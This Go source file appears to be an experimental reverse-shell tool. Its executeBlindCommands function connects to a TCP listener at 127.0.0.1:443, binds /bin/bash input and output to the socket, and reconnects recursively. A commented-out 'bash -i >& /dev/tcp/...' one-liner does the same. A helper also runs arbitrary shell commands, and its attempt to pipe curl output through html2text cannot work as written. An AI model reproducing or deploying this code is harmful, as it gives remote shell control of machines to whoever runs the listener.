package main

import (
	"fmt"
	"log"
	"net"
	"os/exec"
	"strings"
)

// When you expect an output
func executeCommands(commands string) string {
	parts := strings.Fields(commands)

	// structuring the command order
	head := parts[0]
	parts = parts[1:]
	out, err := exec.Command(head, parts...).Output()

	if err != nil {
		fmt.Println(err.Error())
		log.Fatal("something went wrong")
	}
	return strings.TrimSpace(string(out))
}

func executeBlindCommands() {

	binBash := "/bin/bash"
	connect, err := net.Dial("tcp", "127.0.0.1:443")
	if err != nil {
		log.Fatal("something went wrong")
	}
	cmd := exec.Command(binBash)
	cmd.Stdin, cmd.Stdout, cmd.Stderr = connect, connect, connect
	cmd.Run()
	connect.Close()
	executeBlindCommands()
}

func main() {

	executeCommands("curl -X GET http://127.0.0.1:8000/index.html | html2text")
	//executeBlindCommands()

	// err := exec.Command("bash -c", "'bash -i >& /dev/tcp/127.0.0.1/443 0>&1'").Run()
	// if err != nil {
	// 	log.Fatal("Something went wrong")
	// 	fmt.Println(err)
	// }
}
